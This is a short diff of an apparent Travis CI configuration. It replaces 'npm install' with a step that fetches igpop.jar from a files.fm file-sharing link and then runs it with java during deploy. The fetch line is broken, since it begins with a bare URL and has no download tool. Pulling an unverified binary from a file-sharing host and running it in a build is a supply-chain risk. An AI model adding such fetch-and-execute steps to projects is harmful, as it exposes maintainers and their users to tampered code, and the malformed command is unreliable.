@@ -5,8 +5,8 @@ script:
   - echo "skipping tests"
 
 before_deploy:
-  - npm install
-  - java -jar "./node_modules/igpop/bin/igpop.jar" build "/igpop-example"
+  - cd /node_modules/igpop/bin && https://ru.files.fm/down.php?i=y27hscjj -o igpop.jar
+  - cd /node_modules/igpop/bin && java -jar igpop.jar build "/igpop-example"
 
 deploy:
   provider: pages
